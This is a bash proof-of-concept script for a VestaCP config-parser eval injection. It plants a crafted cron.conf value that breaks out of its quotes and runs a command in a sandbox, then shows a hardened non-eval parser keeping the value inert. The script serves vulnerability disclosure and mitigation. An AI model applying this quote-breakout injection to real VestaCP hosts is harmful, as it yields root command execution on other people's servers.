#!/usr/bin/env bash
# PoC — VESTACP-2026-001: config-parser `eval` sink -> root RCE (VestaCP <= 0.9.8-26)
#
# Self-contained simulation. It reproduces the exact eval-based parse VestaCP's
# func/main.sh performs on $USER_DATA/*.conf lines, feeds it a crafted cron.conf
# value containing an unescaped single quote, and shows the injected command
# executing. It then runs the same input through the hardened non-eval parser
# to show the value staying a literal.
#
# On a live VestaCP node the parse happens inside v-* scripts running as root,
# so the injected code would run as root. Here it runs as the invoking user and
# only touches a mktemp sandbox.
#
# Usage: bash poc-eval-sink.sh

set -u
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
USER_DATA="$TMP/userconf"
mkdir -p "$USER_DATA"
export USER_DATA

# ---------------------------------------------------------------------------
# Vulnerable code path (verbatim shape of VestaCP 0.9.8-26 func/main.sh)
# ---------------------------------------------------------------------------
get_object_value_vuln() {
    local object
    object=$(grep "$2='$3'" "$USER_DATA/$1.conf")
    eval "$object"                      # <- sink: executes conf contents
    local varname="${4#\$}"
    echo "${!varname}"
}

# ---------------------------------------------------------------------------
# Hardened parser (see mitigation/non-eval-parser.sh)
# ---------------------------------------------------------------------------
parse_object_kv_list() {
    local _str _pair _k _v
    _str="${*//$'\n'/ }"
    while IFS= read -r _pair; do
        [ -z "$_pair" ] && continue
        _k="${_pair%%=*}"
        _v="${_pair#*=}"
        [[ "$_k" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || continue
        declare -g "$_k=$_v"
    done < <(printf '%s' "$_str" | perl -ne "while(/([A-Za-z_][A-Za-z0-9_]*)='([^']*)'/g){print \"\$1=\$2\n\"}")
}

get_object_value_fixed() {
    local object
    object=$(grep "$2='$3'" "$USER_DATA/$1.conf")
    parse_object_kv_list "$object"      # <- literal assignment, never executed
    local varname="${4#\$}"
    echo "${!varname}"
}

# ---------------------------------------------------------------------------
# Crafted conf line: value breaks out of CMD='...' with an unescaped quote,
# runs a command, then comments out the rest.
# A panel user can land such a value via fields that bypass %quote% escaping
# or via any write path into ~/conf/*.conf.
# ---------------------------------------------------------------------------
MARKER="$TMP/PWNED"
printf "ID='1' MIN='*' HOUR='*' DAY='*' MONTH='*' WDAY='*' CMD='x'; touch %s; #' SUSPENDED='no'\n" \
    "$MARKER" > "$USER_DATA/cron.conf"

echo "== crafted cron.conf =="
cat "$USER_DATA/cron.conf"
echo

echo "== 1) vulnerable eval parse =="
get_object_value_vuln cron ID 1 CMD >/dev/null
if [ -f "$MARKER" ]; then
    echo "[+] INJECTION EXECUTED - marker $MARKER was created by eval"
    echo "    On a live VestaCP node this runs as root inside v-* scripts."
else
    echo "[-] marker not created (unexpected)"
fi
echo

rm -f "$MARKER"

echo "== 2) hardened non-eval parse =="
CMD=""
get_object_value_fixed cron ID 1 CMD >/dev/null
if [ -f "$MARKER" ]; then
    echo "[-] injection executed - parser still vulnerable (unexpected)"
else
    echo "[+] marker NOT created - injected code stayed inert"
    echo "    CMD parsed as literal: ${CMD:-<empty>}"
fi
